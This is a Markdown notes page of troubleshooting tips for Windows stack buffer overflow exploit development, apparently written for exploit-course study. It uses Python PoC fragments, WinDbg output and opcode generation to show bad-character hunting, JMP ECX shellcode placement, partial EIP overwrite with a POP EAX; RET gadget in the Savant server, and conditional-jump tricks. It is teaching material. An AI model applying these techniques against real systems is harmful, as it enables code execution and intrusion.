# Sometimes ...

## Table of Contents

* 1.0 [Not enough space to test bad characters.](#NES-BC)
* 2.0 [Not enough space for the shellcode.](#NES-Shellcode)
* 3.0 [Testing Bad Characters doesn't cause a crash.](#NoCrashBC)
* 4.0 [Unique String Cause Another Crash.](#UniqueStringAnotherCrash)
* 5.0 [Partial EIP Overwrite.](#PartialEIPOverwrite)
  * 5.1 [Partial EIP Overwrite - POP EAX; RET.](#PEO-Alternative)
* 6.0 [Conditional Jumps](#ConditionalJumps)

### 1. Not enough space to test bad characters.<a name="NES-BC"></a>

Sometime, if you didn't have enough size to test all the bad characters in one shot.
 
To overcome this, you can comment all the badchars line, and send the maximum badchars size possible at a time.


### 2. Not enough space for the shellcode.<a name="NES-Shellcode"></a>

If you cant find enought space for the shellcode, once you get the JMP ESP instruction, try to place a shellcode in another buffer (it can be the "A" buffer too) then check if any others registers redirect to our buffer.
 
Then if you find it (example ECX), find the JMP ECX opcodes.
 
```bash
┌──(v0lk3n㉿Laptop)-[~/StackOverflow-Basic]
└─$ msf-nasm_shell
nasm > JMP ECX
00000000  FFE1              jmp ecx
```

Complete the address with NOPs instructions to redirect the flow to it.
 
```python
...
size = 2600
shell = <shellcode here>

buffer = b"\x90" * (size - len(shell))
eip = b"\xcf\x60\x40\x12" # 124060cf JMP ESP 
ecx = b"\xff\xe1\x90\x90" # 0xffe1 JMP ECX NOP NOP
nops = b"\x90" * 10
...
```

### 3. Testing Bad Characters doesn't cause a crash.<a name="NoCrashBC"></a>

Sometimes, sending our bunch of bad characters to test them doesn't cause a crash. This is most likely the result of a bad character.

```python
...
    badchars = (
        #b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c"
        #b"\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19"
        #b"\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26"
        #b"\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33"
        #b"\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
        #b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d"
        #b"\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
        #b"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67"
        #b"\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74"
        #b"\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81"
        b"\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e"
        b"\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b"
        b"\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8"
        b"\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5"
        b"\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"
        b"\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
        b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc"
        b"\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9"
        b"\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6"
        b"\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
        )
...
```

To identify it, we simply comment the first half of the badchars variables. If we succesfully overwrite the isntruction pointer, this mean that the bad chars isn't in the last half of the bad chars.

Repeat this process, since you found all bad chars including the one that prevent the vulnerable application from crashing.

### 4. Unique String Cause Another Crash.<a name="UniqueStringAnotherCrash"></a>

Sometimes, running our PoC with the Unique Pattern (or other similar situation), cause a different crah.

When it happen, how to find the exact offset of EIP? To overcome this we can split our buffer in two parts.

```python
...
inputBuffer = b"\x41" * 130  
inputBuffer+= b"\x42" * 130
...
```

If the EIP is overwritten by "42424242" that mean the exact offset is present in the second half of our buffer. Split the 42 in two part and repeat the process since finding the exact offset.

### 5. Partial EIP Overwrite.<a name="PartialEIPOverwrite"></a>

Sometimes, we can see that our buffer is null-terminated.

```bash
0:003> dds @esp L4  
01fcea2c 00434343 Savant+0x34343 ## 00434343  
01fcea30 01fcea84  
01fcea34 0041703c Savant+0x1703c  
01fcea38 003d5750
```

When it happen, we can use the Partial EIP overwrite technique.

When our executable is mapped in an address range that start with a null byte, we can use the string null terminator as part of our EIP overwrite to redirect the execution flow to the assembly instruction we choose within the module.

```python
...
inputBuffer = b"\x41" * size  
inputBuffer+= b"\x42\x42\x42"
...
```

Run the PoC and our partial EIP overwrite should be a success.

Now we need to decide where we want to redirect the execution flow to.

#### 5.1 Partial EIP Overwrite - POP EAX; RET.<a name="PEO-Alternative"></a>

When we use Partial EIP overwrite technique, we cannot store any data past the return address, because the added null byte will terminate the string. As the ESP register will not point to our buffer we can't use instructions such as JMP ESP.

Let's say we have this output of crash in our WinDbg console :
```bash
0:003> dds @esp L5  
02efea2c 02effe70  
02efea30 02efea84  
02efea34 0041703c Savant+0x1703c  
02efea38 003d56d0  
02efea3c 003d56d0  
  
0:003> dc poi(@esp+0x04)  
02efea84 00544547 00000000 00000000 00000000 GET.............  
02efea94 00000000 00000000 4141412f 41414141 ......../AAAAAAA  
02efeaa4 41414141 41414141 41414141 41414141 AAAAAAAAAAAAAAAA  
02efeab4 41414141 41414141 41414141 41414141 AAAAAAAAAAAAAAAA  
02efeac4 41414141 41414141 41414141 41414141 AAAAAAAAAAAAAAAA  
02efead4 41414141 41414141 41414141 41414141 AAAAAAAAAAAAAAAA  
02efeae4 41414141 41414141 41414141 41414141 AAAAAAAAAAAAAAAA  
02efeaf4 41414141 41414141 41414141 41414141 AAAAAAAAAAAAAAAA
```

We notice that the second DWORD on the stack points very close to our current stack pointer. It seems to point to the HTTP Method, followed by the rest of the data we sent.

Now we need to find an assembly instruction sequence that will redirect the execution flow to this data.

We can use a POP R32; RET instructions sequence.
- The first POP remove the first DWORD from the stack.
- ESP Point to the memory address that containt our buffer starting with the HTTP GET method.
- The RET instruction should place us right at the beginning of our HTTP method.

As part of the POP instruction, we can place the DWORD that ESP points to into the register of our choice.

Inspect the value that will be popped by the first instruction :
```bash
0:003> dds @esp L5  
02efea2c 02effe70 
02efea30 02efea84  
02efea34 0041703c Savant+0x1703c  
02efea38 003d56d0  
02efea3c 003d56d0  
  
0:003> !teb  
TEB at 7ffdc000  
ExceptionList: 02efff70  
StackBase: 02f00000  
StackLimit: 02efc000
...
```

We see that the first DWORD on the stack points to a memory location that is part of the stack space and is therefore a valid memory address.

If we can find an instruction sequence ike POP EAX; RET we can guarentee that EAX will point to a valid memory address.

Get the opcodes :
```bash
┌──(v0lk3n㉿Laptop)-[~/]
└─$ msf-nasm_shell  
nasm > pop eax  
00000000 58 pop eax  
  
nasm > ret  
00000000 C3 ret
```

Search for the sequence in the app :
```bash
0:003> lm m Savant  
Browse full module list  
start end module name  
00400000 00452000 Savant C (no symbols)  
  
0:004> s -[1]b 00400000 00452000 58 c3  
0x00418674  
0x0041924f  
0x004194f6
...
```

Chose an address without bad chars and update the PoC to add the sequence :
```python
...
inputBuffer = b"\x41" * size  
inputBuffer+= pack("<L", (0x418674)) # 0x00418674 - pop eax; ret
...
```

Running it in our scenario show that after the RET instruction, our instruction pointer points to the first assembly instruction generated by the opcodes of the HTTP GET method.

Because we made sure that EAX would contain a valid memory address, we should be able to execute these instructions without generating an access violation, until we reach our buffer of 0x41 characters.

### 6. Conditional Jumps.<a name="ConditionalJumps"></a>

Another way to place us in our buffer is <a href=", http://faydoc.tripod.com/cpu/index_j.htm">Conditional Jumps.</a>

Conditonal Jump execute a jump depending on specific conditions, if the condition is true, the condition is followed by a jump, if it false, it continue the execution without jumping.

Here we will use the conditional jump "JE", it will execute a short jump and the condition for this jump is based on the value of the Zero Flag (ZF) register.

The jump will be taken if the value of ZF register is set to 1 (TRUE).

To use this conditional jump in our exploit, we need to be sure that the ZF register will always be true.

Generate the opcodes for our Conditional Jump :
```bash
┌──(v0lk3n㉿Omen-Laptop)-[~]
└─$ msf-nasm_shell
nasm > xor ecx, ecx
00000000  31C9              xor ecx,ecx
nasm > test ecx, ecx
00000000  85C9              test ecx,ecx
nasm > je 0x17
00000000  0F8411000000      jz near 0x17
```

We notice that there is no bad characters inside those opcodes excepted for the conditional jump opcodes which includes null bytes.

As the memory allocation is zeroed out before the HTTP method is copied to it, we don't need to send the null bytes, send the first opcodes and use the existing null bytes to complete our instruction.

Update the PoC:
```python
httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /" # xor ecx, ecx; test ecx, ecx; je 0x17  
inputBuffer = b"\x41" * size  
inputBuffer+= pack("<L", (0x418674)) # 0x00418674 - pop eax; ret
```

Executing the PoC should place us directly at the beginning of our buffer where our instruction pointer, point to.

